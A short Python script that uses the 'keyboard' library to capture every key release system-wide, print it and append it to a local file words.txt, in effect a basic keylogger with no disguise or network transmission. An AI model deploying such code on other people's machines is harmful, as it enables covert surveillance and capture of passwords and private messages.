import keyboard


def new_event(event : keyboard.KeyboardEvent) -> None :
    print(f"The key is - {event.name}")
    with open("words.txt", "a") as file:
        file.write(f"{event.name} " )
        file.flush()

keyboard.on_release(callback=new_event)
keyboard.wait()